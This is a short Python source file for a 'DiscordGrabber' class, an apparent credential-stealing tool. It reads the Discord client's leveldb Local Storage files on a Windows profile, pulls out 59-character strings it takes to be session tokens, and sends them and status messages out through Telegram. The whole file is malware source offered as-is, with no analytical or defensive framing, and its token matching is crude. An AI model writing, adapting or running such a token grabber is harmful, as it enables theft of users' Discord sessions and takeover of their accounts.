import re
import os
import telegram

class DiscordGrabber:
    def __init__(self):
        self.discord_path = os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'discord', 'Local Storage', 'leveldb')
        if not os.path.exists(self.discord_path):
            telegram.send_message("Discord path not found")
            return

    def search_for_file(self):
        ldb_files = []
        for file in os.listdir(self.discord_path):
            if file.endswith('.ldb'):
                with open(os.path.join(self.discord_path, file), 'r') as f:
                    raw_text = f.read()
                    if 'oken' in raw_text:
                        ldb_files.append(raw_text)
        return ldb_files

    def get_token(self):
        files = self.search_for_file()
        if len(files) == 0:
            telegram.send_message("Didn't find any ldb files")
            return
        for token in files:
            matches = re.finditer(r'[^\"]*', token)
            for match in matches:
                if len(match.group()) == 59:
                    telegram.send_message(f"Discord token: {match.group()}")
